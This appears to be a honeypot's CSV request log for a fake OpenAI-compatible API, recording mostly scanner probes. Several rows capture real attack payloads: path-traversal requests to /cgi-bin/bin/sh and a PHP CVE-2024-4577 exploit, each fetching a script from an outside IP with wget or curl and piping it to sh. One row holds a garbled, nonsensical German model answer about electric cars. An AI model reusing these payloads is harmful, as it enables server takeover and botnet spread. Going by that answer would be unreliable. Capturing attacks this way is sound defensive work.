request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
ce0d466e-c04e-46db-b72d-f8f54da4ecf5,2026-03-28T15:40:56.846616+00:00,anon_a8f03231,POST,/api/generate,[honeypot-host],bruno-runtime/3.2.0,,109,2741,1,qwen-research:latest,Nenne drei Vorteile von Elektroautos.,"{
  ""model"": ""qwen-research:latest"",
  ""prompt"": ""Nenne drei Vorteile von Elektroautos."",
  ""stream"": false
}",200,OK,"{""model"":""qwen-research:latest"",""created_at"":""2026-03-28T15:40:56.830612419Z"",""response"":""Elektroautos haben eine Reihe wichtiger Vorteile:\n\n1. Erleichteter Verlust der Reifen: Ein Elektroautos kann in weniger als 6-8 Stunden wiederholt werden, was zu einem geringeren Verlust des Reifens für den Fahrer führt.\n\n2. Gleichzeitige Verhaltensaufwand: Elektroautos haben eine einfache Steuerungsmethodik und können gleichzeitig von verschiedenen Geräten abgeleitet werden. Es ist einfacher, um eine elektrische Fahrzeug anzuhalten oder zu überprüfen.\n\n3. Erweiterte Sicherheit: Elektroautomatiker ermöglichen es, die elektronischen Systeme von Elektricität und Verhaltenskontrolle zu bestreiten, was zu einer höheren Gesundheitszustandlichkeit führt.\n\n4. Gleiches Fahrzeugsystem: Elektroautos haben eine solche, abgekürzte Form der Fahrzeugansammlung. Das kann zu einem geringeren Fahrzeugkosten geben und zu einer höherer Gesundheitslage führen."",""done"":true,""done_reason"":""stop"",""context"":[151644,8948,271,2610,525,264,9767,15235,16151,21388,369,5787,39620,26880,12,17,15,17,21,624,50425,3450,25,508,38634,19811,6208,6222,1914,4835,12,24,921,7082,77795,16607,25,220,16,15,13,15,13,20,13,19,19,198,15352,10974,25,3155,537,16400,1493,5306,13912,311,44471,3847,624,151645,198,151644,872,198,45,25136,57519,647,16568,457,6538,25949,5840,299,79301,13,151645,198,151644,77091,198,45339,5840,299,79301,17630,9820,83141,383,90796,7272,647,16568,457,1447,16,13,9740,273,4865,1404,6250,70979,2694,1032,55339,25,18069,25949,5840,299,79301,15719,304,83801,10712,220,21,12,23,80544,26252,71,6181,12643,11,572,6395,17443,342,4671,17392,6250,70979,939,1032,333,724,7180,3371,77200,261,50232,3342,382,17,13,479,54371,29413,7256,6250,39416,724,50528,79810,25,25949,5840,299,79301,17630,9820,31287,1777,3360,8801,2185,3563,1068,1579,2030,20048,55248,97973,6538,88687,19929,2305,1960,668,709,273,41538,12643,13,9236,5999,31287,11007,11,4443,9820,62788,376,10559,77200,37400,458,25655,35505,12385,6395,13785,66693,30353,382,18,13,9740,73411,13820,74303,22385,25,25949,5840,299,27073,266,24803,97035,21673,1531,11,2746,62788,34685,17739,739,68,6538,25949,74,376,18677,14033,2030,6250,39416,724,39720,1080,273,6395,1850,265,14668,11,572,6395,17058,139554,268,20404,1241,87818,89,590,437,88185,50232,3342,382,19,13,479,54371,288,77200,37400,8948,25,25949,5840,299,79301,17630,9820,2048,1528,11,668,709,127356,89282,3377,2694,77200,37400,596,309,1014,2185,13,19000,15719,6395,17443,342,4671,17392,77200,37400,74,14012,56500,2030,6395,17058,139554,261,20404,1241,87818,55754,50232,1440,13],""total_duration"":15044887929,""load_duration"":252343772,""prompt_eval_count"":83,""prompt_eval_duration"":1620443890,""eval_count"":240,""eval_duration"":12355185069}",15063,
220005e0-79b7-460d-8a43-cf7159072a5d,2026-03-28T15:58:43.441587+00:00,anon_e1e5b879,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
fa3971a8-f9be-46ac-8121-692520ea70d2,2026-03-28T15:59:50.338298+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
c4ccd811-94ca-41ec-a730-078b635b804f,2026-03-28T16:03:58.143883+00:00,anon_2656272b,GET,/cgi-bin/luci/;stok=/locale,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
af73a407-1141-430d-8726-716168ab361d,2026-03-28T16:08:04.309461+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",1,
6ca7e6c4-c07d-480b-b678-5098184ed5a7,2026-03-28T16:30:22.750807+00:00,anon_fade0fb0,GET,/,,,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
734550d5-8bb0-4feb-a6d7-45dbed93a0fe,2026-03-28T16:30:28.998318+00:00,anon_fade0fb0,GET,/nmaplowercheck1774715429,[honeypot-host],Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f165cec3-34be-411c-9d68-9da28ecd8ea7,2026-03-28T16:30:29.066666+00:00,anon_fade0fb0,POST,/sdk,[honeypot-host],Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),,441,118,1,,"<soap:Envelope xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Header><operationID>00000001-00000001</operationID></soap:Header><soap:Body><RetrieveServiceContent xmlns=""urn:internalvim25""><_this xsi:type=""ManagedObjectReference"" type=""ServiceInstance"">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>","<soap:Envelope xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""><soap:Header><operationID>00000001-00000001</operationID></soap:Header><soap:Body><RetrieveServiceContent xmlns=""urn:internalvim25""><_this xsi:type=""ManagedObjectReference"" type=""ServiceInstance"">ServiceInstance</_this></RetrieveServiceContent></soap:Body></soap:Envelope>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
81c997e1-de9a-4c05-8207-ec08aa52e69e,2026-03-28T16:30:29.071679+00:00,anon_fade0fb0,GET,/,,,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
2f041125-f47e-43fb-8612-9512537c94ea,2026-03-28T16:30:29.321983+00:00,anon_fade0fb0,GET,/HNAP1,[honeypot-host],Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bee889b0-8ff2-4100-8e9c-caa263b1f0bc,2026-03-28T16:30:29.371426+00:00,anon_fade0fb0,GET,/evox/about,[honeypot-host],Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
57c6570b-4210-49e7-86f1-fb9ebf670174,2026-03-28T16:30:41.776596+00:00,anon_fade0fb0,GET,/,,,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
3cfbed91-82f1-4da9-96ce-b7f1b6945c83,2026-03-28T16:30:42.077228+00:00,anon_fade0fb0,GET,/,[honeypot-host],,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
2d7265e1-1850-407c-a853-4afc32904b27,2026-03-28T16:38:34.347902+00:00,anon_e565fb93,GET,/,[honeypot-host],Go-http-client/1.1,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
95d04b7e-b8d9-422d-9b98-b8ab8d01cbb2,2026-03-28T16:40:44.983235+00:00,anon_7984de19,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
8423cc9a-34f9-41d5-ba46-8ad41f079488,2026-03-28T16:41:27.986270+00:00,anon_7984de19,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
616c3cdd-a385-44ed-abae-f19a339349a2,2026-03-28T16:41:29.579440+00:00,anon_7984de19,POST,/hello.world,[honeypot-host],libredtail-http,,241,118,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
82415d00-aa5d-4c0c-a821-022f3a435789,2026-03-28T16:44:45.953917+00:00,anon_c44ab514,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
fd6242a7-3ef9-40a9-b607-8d4bc6ad13ca,2026-03-28T16:45:11.706160+00:00,anon_c44ab514,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
8592c72b-8ef0-4a1a-a4f2-ca90f44f3855,2026-03-28T16:59:05.868353+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
e521f59d-29a5-4de3-a41f-809f4b7a6288,2026-03-28T17:30:35.088586+00:00,anon_02977894,GET,/,[honeypot-host],Mozilla/1.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
6d498b39-b68e-4f5c-a8ae-fae03c4e3253,2026-03-28T17:33:50.798611+00:00,anon_cdce798b,GET,/,[honeypot-host],Linux Gnu (cow) ,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
c374a391-82aa-43a7-aca0-7c62778289f6,2026-03-28T17:44:25.684075+00:00,anon_735ed0b9,GET,/cgi-bin/luci/;stok=/locale,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
2511f677-6b86-4ef4-a15e-8c86a7974bec,2026-03-28T17:56:48.837689+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4cc33af1-3108-426d-8bcf-151ee5d43c34,2026-03-28T17:57:57.126229+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
44b30c5a-5b43-4121-8d8b-06b7e6423107,2026-03-28T18:50:05.732714+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
c6f64a98-487c-4b89-a6af-80c926d1b6e6,2026-03-28T19:03:49.740960+00:00,anon_e35a84d4,GET,/developmentserver/metadatauploader,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a85f862c-5d3b-43b7-a4d1-cc3d5aa4d2fc,2026-03-28T19:20:09.948872+00:00,anon_02e2f139,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
075f6f45-6a77-4c66-8173-067ed77a7435,2026-03-28T19:46:24.660756+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
b7b2afbc-cfce-44dc-afda-35085da31ebb,2026-03-28T20:42:35.097368+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
6222d3a9-cb68-49db-bf66-c51d22b18d5b,2026-03-28T20:43:06.314654+00:00,anon_02e2f139,GET,/actuator/gateway/routes,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
